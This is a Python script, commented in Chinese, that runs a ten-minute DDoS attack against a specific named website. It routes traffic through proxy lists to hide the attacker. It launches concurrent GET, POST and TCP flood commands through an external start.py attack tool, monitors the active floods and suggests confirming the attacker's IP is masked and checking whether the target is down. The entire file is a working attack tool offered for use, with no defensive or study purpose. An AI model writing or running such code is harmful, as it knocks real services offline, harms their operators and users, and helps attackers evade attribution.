#!/usr/bin/env python3
"""
最终安全DDoS攻击工具
直接使用现有配置，避免复杂验证
"""

import subprocess
import time
import os

def check_network_status():
    """检查网络状态"""
    print("🔍 检查网络状态...")
    
    try:
        # 使用ping测试网络连通性
        result = subprocess.run(['ping', '-n', '1', 'www.baidu.com'], 
                              capture_output=True, text=True)
        if 'TTL=' in result.stdout:
            print("✅ 网络连接正常")
            return True
        else:
            print("❌ 网络连接异常")
            return False
    except:
        print("❌ 网络检查失败")
        return False

def start_safe_ddos_attack():
    """启动安全DDoS攻击"""
    target = "https://www.kjqun.cn/"
    
    print("="*60)
    print("🚀 最终安全DDoS攻击启动")
    print("="*60)
    print(f"🎯 目标: {target}")
    print(f"⚡ 配置: 中等强度，安全优先")
    print("-"*60)
    
    # 使用现有的代理文件
    proxy_files = [
        'files/proxies/proxies.txt',
        'files/proxies/http.txt'
    ]
    
    proxy_file = 'proxies.txt'
    for file in proxy_files:
        if os.path.exists(file):
            proxy_file = file
            break
    
    print(f"📁 使用代理文件: {proxy_file}")
    
    # 定义多种攻击方法（安全配置）
    attack_commands = [
        {
            'name': 'GET方法攻击',
            'command': f'python start.py GET {target} 0 80 {proxy_file} 80 600'
        },
        {
            'name': 'POST方法攻击', 
            'command': f'python start.py POST {target} 0 60 {proxy_file} 60 600'
        },
        {
            'name': 'TCP方法攻击',
            'command': f'python start.py TCP www.kjqun.cn:80 100 600'
        }
    ]
    
    # 启动攻击
    processes = []
    
    for attack in attack_commands:
        print(f"\n🚀 启动{attack['name']}...")
        print(f"📝 命令: {attack['command']}")
        
        try:
            process = subprocess.Popen(attack['command'], shell=True)
            processes.append((process, attack['name']))
            print(f"✅ {attack['name']}已启动")
            time.sleep(2)  # 延迟避免冲突
        except Exception as e:
            print(f"❌ {attack['name']}启动失败: {e}")
    
    print(f"\n✅ 总共启动 {len(processes)} 种攻击方法")
    print("⏰ 攻击将持续10分钟")
    
    # 监控攻击状态
    start_time = time.time()
    duration = 600  # 10分钟
    
    while time.time() - start_time < duration:
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        
        # 检查进程状态
        active_count = 0
        for process, name in processes:
            if process.poll() is None:
                active_count += 1
        
        print(f"⏰ 已运行: {elapsed//60}分{elapsed%60}秒 | 剩余: {remaining//60}分{remaining%60}秒 | 活跃攻击: {active_count}/{len(processes)}")
        
        # 每30秒报告一次
        time.sleep(30)
    
    # 停止攻击
    print("\n🛑 攻击时间结束，正在停止...")
    for process, name in processes:
        if process.poll() is None:
            try:
                process.terminate()
                print(f"🛑 已停止{name}")
            except:
                print(f"❌ 停止{name}失败")
    
    print("✅ 所有攻击已停止")
    
    # 最终统计
    print("\n" + "="*60)
    print("📊 攻击完成统计")
    print("="*60)
    print(f"🎯 目标网站: {target}")
    print(f"⏱️ 攻击时长: 10分钟")
    print(f"⚡ 攻击方法: {len(processes)}种")
    print(f"🔒 保护方式: 代理保护")
    print("")
    print("💡 使用手机访问 itdog.cn 查看目标状态")
    print("="*60)

def main():
    # 检查网络状态
    if not check_network_status():
        print("❌ 网络异常，无法进行攻击")
        return
    
    # 显示当前IP信息
    print("\n📡 当前网络信息:")
    print("💡 建议先验证IP是否变化:")
    print("   curl http://httpbin.org/ip")
    print("")
    print("🔒 安全提醒:")
    print("   • 攻击将使用代理保护")
    print("   • 中等强度避免触发限制")
    print("   • 实时监控攻击状态")
    
    # 确认开始攻击
    choice = input("\n是否开始安全DDoS攻击? (y/n): ")
    if choice.lower() == 'y':
        start_safe_ddos_attack()
    else:
        print("🛑 用户取消攻击")

if __name__ == "__main__":
    main()